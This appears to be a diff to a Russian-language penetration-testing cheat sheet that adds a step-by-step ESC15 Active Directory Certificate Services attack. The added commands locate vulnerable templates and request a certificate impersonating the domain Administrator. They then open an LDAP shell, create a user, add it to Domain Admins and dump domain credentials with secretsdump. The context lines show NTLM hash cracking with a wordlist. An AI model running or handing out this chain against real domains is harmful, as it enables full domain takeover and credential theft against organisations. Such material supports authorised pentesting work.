@@ -23,3 +23,28 @@ john ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
 Если нашло уязвимых шаблонов:
 certipy find -u 'pentest@domain.com' -p 'password' -dc-ip 'ip od DC' -text -enabled -hide-admins -stdout
 
+
+
+ESC15 
+# поиск уязвимых шаблонов
+certipy-ad find -u 'user' -p 'superpuperpassword' -dc-ip 10.10.10.10  -enabled -vuln -ldap-scheme ldap -stdout -debug
+# поиск sid в домене
+impacket-lookupsid 'domain.ru/user:'superpuperpassword'@10.10.10.10'
+#запрашиваем pfx администратора домена
+certipy req \
+    -u 'user' -p 'superpuperpassword' \
+    -dc-ip '10.10.10.10' -target 'dc2.domain.ru' \
+    -ca 'vuln_DC2-CA' -template 'vuln_WebServer' \
+    -upn 'Administator@domain.ru' -sid 'S-1-5-21-434343434-43434343-47837483747-500' \
+    -application-policies 'Client Authentication'
+-> получаем Administator.pfx файл
+certipy auth -pfx 'Administator.pfx' -dc-ip '10.10.10.10' -ldap-shell
+-> получаем ldap_shell 
+# создаем пользователя  (ему назначается пароль)
+add_user pentest_user
+# Добавляем пользователя в группу администраторы домена 
+add_user_to_group pentest_user "Администраторы домена"
+# Смена пароля на нормальный 
+change_password pentest_user NewStrongPassword123!
+# дампим учетки
+impacket-secretsdump 'domain.ru/pentest_user:NewStrongPassword123!@10.10.10.10'
